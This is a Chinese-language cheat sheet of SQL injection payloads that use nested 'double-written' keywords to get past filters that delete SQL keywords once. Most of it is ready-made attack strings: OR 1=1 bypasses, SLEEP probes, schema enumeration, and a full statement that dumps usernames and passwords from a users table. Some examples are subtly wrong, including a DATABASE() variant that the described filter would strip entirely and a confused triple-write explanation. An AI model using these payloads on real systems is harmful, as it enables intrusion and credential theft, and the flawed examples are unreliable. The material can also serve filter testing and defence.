# 双写绕过 (Double Writing Bypass)

## 核心原理

部分 WAF 或输入过滤器在检测到 SQL 关键词后会将其**删除**（而非阻断整个请求），然后再将处理后的输入传给数据库。攻击者利用这一行为，将关键词写成嵌套形式，使得过滤器删除关键词后，剩余字符重新组合成完整的关键词。

```
原始输入：     seSELECTlect
过滤器处理后： select      （中间的 SELECT 被删除，两端字符拼接）
数据库收到：   select      （正常执行）
```

## 模板

```sql
' UNION SELSELECTECT 1,2,3--
' OORR 1=1--
```

## 常见关键词双写变体

| 原始关键词 | 双写变体 | 过滤后 |
|-----------|---------|--------|
| `SELECT` | `SELSELECTECT` | `SELECT` |
| `UNION` | `UNIUNIONON` | `UNION` |
| `FROM` | `FRFROMOM` | `FROM` |
| `WHERE` | `WHWHEREERE` | `WHERE` |
| `OR` | `OORR` | `OR` |
| `AND` | `AANDND` | `AND` |
| `INSERT` | `INSINSERTERT` | `INSERT` |
| `UPDATE` | `UPUPDATEATE` | `UPDATE` |
| `DELETE` | `DEDELETELETE` | `DELETE` |
| `DROP` | `DRDROPOP` | `DROP` |
| `ALTER` | `ALALTERTER` | `ALTER` |
| `EXEC` | `EXEXECC` | `EXEC` |
| `INFORMATION_SCHEMA` | `INFORINFORMATION_SCHEMAMATION_SCHEMA` | `INFORMATION_SCHEMA` |

## 完整示例

### UNION 注入

```sql
' UNIUNIONON SELSELECTECT 1,2,3--
' UNIUNIONON ALL SELSELECTECT database(),user()--
```

### WHERE 子句注入

```sql
' OORR 1=1--                  -- 绕过 OR 过滤
' AANDND 1=1--                -- 绕过 AND 过滤
' UNION SELSELECTECT 1,2,3 FRFROMOM users--
```

### 绕过表名检测

```sql
' UNION SELSELECTECT 1,group_concat(table_name),3 FRFROMOM INFORINFORMATION_SCHEMAMATION_SCHEMA.TABLES WHWHEREERE TABLE_SCHEMA=DATABASE()--
```

### 绕过函数名检测

```sql
' AND SLEESLEEPEP(5)--                          -- 绕过 SLEEP 过滤
' AND UPDATEXML(1,CONCAT(0x7e,DATABASEDATABASE()),1)--  -- 绕过函数名过滤
```

### 完整脱库语句

```sql
' UNIUNIONON SELSELECTECT group_concat(username,0x7e,passwoorrd),2,3 FRFROMOM users--
```

## 变体：三写绕过

当过滤器进行两轮删除时，使用三层嵌套：

```
原始：     SESESELECTLECTECT
第一轮：   SELECTLECT  →  只剩 SELECT（但 LECT 留下了）
实际效果取决于过滤器的具体逻辑
```

对于执行多轮替换的过滤器（`preg_replace` 循环删除），可以考虑三写或更多层的嵌套。但现代 WAF 很少采用"删除后不重新扫描"的简单策略。

## 适用条件

- 过滤器仅在输入流中**删除**匹配的关键词子串，而非阻断整个请求
- 删除操作只执行一次（单轮替换），而非循环删除

## 局限性

- 现代 WAF 通常采用阻断而非删除策略
- 多数 WAF 对 SQL 关键词的检测已包含变体识别
- 如果使用循环正则替换（如 PHP `preg_replace` 的循环模式），双写会失败
